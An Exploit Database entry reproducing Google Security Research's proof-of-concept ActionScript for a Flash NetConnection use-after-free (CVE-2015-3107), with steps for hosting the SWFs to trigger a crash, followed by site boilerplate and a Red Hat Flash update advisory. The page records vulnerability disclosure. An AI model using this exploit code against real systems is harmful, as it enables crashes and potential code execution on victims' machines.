# Adobe Flash - NetConnection.connect Use-After-Free

#### EDB-ID:

###### 37850

#### CVE:

###### [2015-3107](https://nvd.nist.gov/vuln/detail/CVE-2015-3107)

**EDB Verified:**

#### Author:

###### [Google Security Research](/?author=7725)

#### Type:

###### [dos](/?type=dos)

**Vulnerable App:**

```
Source: https://code.google.com/p/google-security-research/issues/detail?id=352&can=1&q=label%3AProduct-Flash%20modified-after%3A2015%2F8%2F17&sort=id

If the fpadInfo property of a NetConnection object is a SharedObject, a use-after-free occurs when the property is deleted. A proof-of-concept is as follows:

var s = SharedObject.getLocal("test");

ASSetPropFlags(s, null, 0, 0xff);
ASSetPropFlags(s.data, null, 0, 0xff);
var q = {myprop  :"natalie", myprop2 : "test"};
s.data.fpadInfo = q;
s.flush();
var n = new NetConnection();
ASnative(2100, 200)(s.data);
n.connect.call(s.data, "");
trace(s.data.fpadInfo);
s = 1;

//GC happens here

setInterval(f, 1000);

function f(){

	ASnative(252, 1).call(q); //Array push
	delete q.myprop;

	}

A fla, an AS file and two swfs are attached. shareddelete.fla compiles to shareddelete.swf and contains the code that causes the use-after-free. loadswf.as compiles to loadswf.swf, and sets up the heap to cause a crash. To make the issue occur, put loadswf.swf and shareddelete.swf in the same folder on a webserver (the PoCs don't always work locally due to flash network sandboxing), and load loadswf.swf. This PoC only works on 64-bit systems, but the issue would work on a 32-bit system with proper heap set-up.

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.

## Topic

An updated Adobe Flash Player package that fixes multiple security issues
is now available for Red Hat Enterprise Linux 5 and 6 Supplementary.

Red Hat Product Security has rated this update as having Critical security
impact. Common Vulnerability Scoring System (CVSS) base scores, which give
detailed severity ratings, are available for each vulnerability from the
CVE links in the References section.

## Description

The flash-plugin package contains a Mozilla Firefox compatible Adobe Flash
Player web browser plug-in.

This update fixes multiple vulnerabilities in Adobe Flash Player. These
vulnerabilities are detailed in the Adobe Security Bulletin APSB15-11
listed in the References section.

Multiple flaws were found in the way flash-plugin displayed certain SWF
content. An attacker could use these flaws to create a specially crafted
SWF file that would cause flash-plugin to crash or, potentially, execute
arbitrary code when the victim loaded a page containing the malicious SWF
content. (CVE-2015-3100, CVE-2015-3103, CVE-2015-3104, CVE-2015-3105,
CVE-2015-3106, CVE-2015-3107)

Multiple security bypass flaws were found in flash-plugin that could lead
to the disclosure of sensitive information. (CVE-2015-3096, CVE-2015-3098,
CVE-2015-3099, CVE-2015-3102)

A memory information leak flaw was found in flash-plugin that could
allow an attacker to potentially bypass ASLR (Address Space Layout
Randomization) protection, and make it easier to exploit other flaws.
(CVE-2015-3108)

All users of Adobe Flash Player should install this updated package, which
upgrades Flash Player to version 11.2.202.466.

## Solution

Before applying this update, make sure all previously released errata
relevant to your system have been applied.
